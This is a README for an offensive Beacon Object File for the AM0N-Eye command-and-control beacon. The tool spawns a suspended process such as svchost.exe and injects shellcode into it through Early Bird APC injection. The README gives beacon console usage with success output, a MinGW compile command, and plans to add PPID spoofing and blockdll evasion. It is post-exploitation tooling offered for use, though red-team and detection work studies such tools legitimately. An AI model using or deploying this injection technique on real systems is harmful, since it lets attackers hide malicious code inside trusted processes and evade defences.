## process-hollowing - AM0N-Eye BOF
##### Authors:

Beacon Object File (BOF) that spawns an arbitrary process from beacons memory in a suspended state, inject shellcode, hijack main thread with APC, and execute shellcode; using the Early Bird injection method taught 

### Run from AM0N-Eye Beacon Console

```bash
beacon> help process-hollowing
Synopsis: process-hollowing /path/to/process-hollowing/pe /local/path/to/shellcode.bin
beacon> process-hollowing svchost.exe /Users/bobby.cooke/popCalc.bin
[*] process-hollowing - EarlyBird Remote Process Shellcode Injector
[*] Reading shellcode from: /Users/bobby.cooke/popCalc.bin
[+] Success - Spawned process for svchost.exe at 5464 (PID)
[+] Success - Allocated RE memory in remote process 5464 (PID) at: 0x000001A83BEC0000
[+] Success - Wrote 280 bytes to memory in remote process 5464 (PID) at 0x000001A83BEC0000
[+] Success - APC queued for main thread of 5464 (PID) to shellcode address 0x000001A83BEC0000
[+] Success - Your thread was resumed and your shellcode is being executed within the remote process!
```

### Compile with x64 MinGW (only tested from macOS):
```bash
x86_64-w64-mingw32-gcc -c process-hollowing.x64.c -o process-hollowing.x64.o
```

### To Do List
+ Refactor code to make it more modular/clean
- Combine this with the PPID spoofing and blockdll features of SPAWN



